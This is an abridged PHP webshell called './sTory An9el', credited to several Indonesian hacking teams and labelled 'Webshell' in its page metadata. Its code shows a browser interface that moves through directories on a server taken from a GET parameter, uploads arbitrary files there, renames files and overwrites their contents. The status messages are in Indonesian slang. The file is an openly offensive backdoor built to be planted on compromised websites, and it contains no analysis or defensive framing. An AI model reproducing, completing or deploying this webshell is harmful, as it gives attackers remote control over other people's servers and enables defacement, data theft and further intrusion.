...
$sname       = "<font color=white><b>./sTory An9el";
...
echo '<!DOCTYPE html><html><head><link href="https://fonts.googleapis.com/css?family=VT323" rel="stylesheet"><title>./sTory An9el</title><meta property="og:title" content="Webshell"> <meta property="og:description" content="./sTory An9el"> <meta property="og:image" content="https://1.bp.blogspot.com/-AlD8Hean4hY/YPHKqg752yI/AAAAAAAAALY/NEY5HGvp-DE2lNDRsvncp7Wy6FuWBmNJACPcBGAYYCw/s225/images%2B%25282%2529.jpeg"> <meta property="og:author" content="Webshell"> <link rel="icon" type="image/png" href="https://1.bp.blogspot.com/-AlD8Hean4hY/YPHKqg752yI/AAAAAAAAALY/NEY5HGvp-DE2lNDRsvncp7Wy6FuWBmNJACPcBGAYYCw/s225/images%2B%25282%2529.jpeg"><body style=background-color:black;"><script src="https://ajax.googleapis.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script></head><body>';
echo '<center><img src="https://1.bp.blogspot.com/-xSxMospbeTo/YPrcVaJslbI/AAAAAAAAALo/b167YRXyf1gVml-s-pjsnalHG9LqmlFyQCLcBGAsYHQ/w285-h244/gif_07-21-10.50.10.gif" width="250" height="250"></center>';
echo '<div style="color:white;margin-top:0;"><h1><center>' . $sname . '</center></h1></div>';
if (isset($_GET['path'])) {
    $path = $_GET['path'];
    chdir($_GET['path']);
} else {
...
echo '<br>[ <a href="?">Home</a> ]</font></td><td align="center" width="27%"><form enctype="multipart/form-data" method="POST"><input type="file" name="file" style="color:white;margin-bottom:4px;"/><input type="submit" value="Upload" /></form></td></tr><tr><td colspan="2">';
if (isset($_FILES['file'])) {
    if (copy($_FILES['file']['tmp_name'], $path . '/' . $_FILES['file']['name'])) {
        echo '<center><font color="white">Upload OK kirik!</font></center><br/>';
    } else {
        echo '<center><font color="red">beli bisa upload!</font></center><br/>';
    }
}
    ...
    if ($_POST['opt'] == 'rename') {
        if (isset($_POST['newname'])) {
            if (rename($_POST['path'], $path . '/' . $_POST['newname'])) {
                ...
                echo '<center><font color="red">Rename gagal kirik!</font></center><br />';
            }
        ...
        if (isset($_POST['src'])) {
            ...
            if (fwrite($fp, $_POST['src'])) {
                echo '<center><font color="white">Edit File OKirik!.</font></center><br />';
            } else {
                echo '<center><font color="red">Edit gagal kirik!.</font></center><br />';
            }
            fclose($fp);
        }
...
echo '<br><center><font color=White><b>Subang }{ploits - Banyumas Cyber Team - Infinity Cyber Team - Subang Cyber Team</center><br>';
